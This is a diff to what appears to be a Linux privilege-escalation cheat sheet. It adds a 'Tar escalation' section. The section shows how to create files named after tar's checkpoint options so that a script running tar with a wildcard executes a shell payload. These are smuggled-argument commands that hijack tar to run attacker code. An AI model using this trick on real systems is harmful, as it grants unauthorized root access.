@@ -28,3 +28,12 @@ sudo -l
 ```
 
 [https://gtfobins.github.io](https://gtfobins.github.io)
+
+## Tar escalation
+
+If some script is using some like: `tar czf file.tar.gz *`.
+
+```bash
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
